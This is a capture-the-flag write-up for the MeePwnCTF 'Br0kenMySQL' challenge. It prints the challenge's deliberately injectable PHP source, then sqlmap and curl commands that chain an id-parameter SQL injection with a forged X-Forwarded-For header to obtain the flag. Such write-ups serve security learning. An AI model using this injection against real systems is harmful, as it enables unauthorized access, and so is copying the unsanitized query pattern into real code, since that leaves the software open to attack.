# Br0kenMySQL

**100 pts**

> [BabeTrick](http://139.59.239.133/?debug=%F0%9F%95%B5)

---

# Writeups
```php
<title>Br0kenMySQL</title><h1><pre>
<p style='color:Red'>Br0kenMySQL</p>
<?php

if($_GET['debug']=='🕵') die(highlight_file(__FILE__));

require 'config.php';

$link = mysqli_connect('localhost', MYSQL_USER, MYSQL_PASSWORD);

if (!$link) {
    die('Could not connect: ' . mysql_error());
}

if (!mysqli_select_db($link,MYSQL_USER)) {
    die('Could not select database: ' . mysql_error());
}
    $id = $_GET['id'];
    if(preg_match('#sleep|benchmark|floor|rand|count#is',$id))
        die('Don\'t hurt me :-(');
    $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id);
    $row = mysqli_fetch_array($query);
    $username = $row['username'];

    if($username === 'guest'){

        $ip = @$_SERVER['HTTP_X_FORWARDED_FOR']!="" ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
        if(preg_match('#sleep|benchmark|floor|rand|count#is',$ip))
            die('Don\'t hurt me :-(');
        var_dump($ip);
        if(!empty($ip))
            mysqli_query($link,"INSERT INTO logs VALUES('{$ip}')");

        $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id);
        $row = mysqli_fetch_array($query);
        $username = $row['username'];
        if($username === 'admin'){
            echo "What ???????\nLogin as guest&admin at the same time ?\nSeems our code is broken, here is your bounty\n";
            die(FLAG);
        }
        echo "Nothing here";
    } else {
        echo "Hello ".$username;
    }
?>
</h1>
</pre>

1
```

## Reading the code
First of all, search the flag. We can get the flag only if you login as guest and admin at the same time.
```php
if($username === 'guest'){
    ...
    if($username === 'admin'){
        ...
        die(FLAG);
    }
    ...
}
```
There exist 2 parameters we could use: ***$_GET['id']*** ***@$_SERVER['HTTP_X_FORWARDED_FOR']***. The header is also a paramete we can set. After a few seconds of try and error we get the id of the user guest (2) and admin (1). The header is store in the table logs.
```php
mysqli_query($link,"INSERT INTO logs VALUES('{$ip}')");
```
## Testing our thoughts
In the table ***logs*** looks like there is a value named **ip** and we can confirm it with a simple sqlmap search. We test if we can hack the header as well.
```bash
$ sqlmap --dbms -u "http://139.59.239.133/?id=2 -T logs"
$ curl --header "X-Forwarded-For: 'we can hack it'" "http://139.59.239.133/?id=2"
```
## SQL injection
1. We need the username with id 2 ***(guest)***
2. We insert the variable "@$_SERVER['HTTP_X_FORWARDED_FOR']" in the table **logs**
3. We need the username with id 1 ***(admin)***

The full sql looks like this (with the ip as a random number):
```mysql
SELECT username FROM users WHERE id = 2 or id=(SELECT 1 FROM logs WHERE ip=5641314)
```
## Our friend curl
As soon as the random number already exsists in the table **logs** the sql will return the first id, in this case ***admin (id=1)*** user. We need to be sure that **@$_SERVER['HTTP_X_FORWARDED_FOR']** is never used in the table. A random number will do the trick.
```bash
$ curl --header "X-Forwarded-For: 5641314" "http://139.59.239.133/?id=2%20or%20id=(SELECT%201%20FROM%20logs%20WHERE%20ip=5641314)"
```
```html
<title>Br0kenMySQL</title><h1><pre>
<p style='color:Red'>Br0kenMySQL</p>
string(8) "86574965"
What ???????
Login as guest&admin at the same time ?
Seems our code is broken, here is your bounty
MeePwnCTF{_b4by_tr1ck_fixed}
```
### MeePwnCTF{_b4by_tr1ck_fixed}
